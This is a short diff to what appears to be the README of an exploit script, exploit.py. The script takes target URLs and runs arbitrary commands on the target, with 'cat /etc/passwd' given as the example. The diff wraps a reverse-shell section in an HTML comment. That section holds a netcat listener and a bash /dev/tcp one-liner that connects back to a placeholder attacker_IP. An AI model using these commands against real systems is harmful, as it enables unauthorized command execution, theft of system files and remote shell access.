@@ -19,8 +19,10 @@ exploit.py [-h] [-u URL] [-c COMMAND] [-f FILE]
 python3 exploit.py -u https://target_IP -c 'cat /etc/passwd'
 python3 exploit.py -f urls.txt
 ```
+<!--
 - Reverse Shell:
 ```
 nc -nvlp 8888
 python3 exploit.py -u https://target_IP -c "bash -i >&/dev/tcp/attacker_IP/8888 0>&1"
 ```
+-->
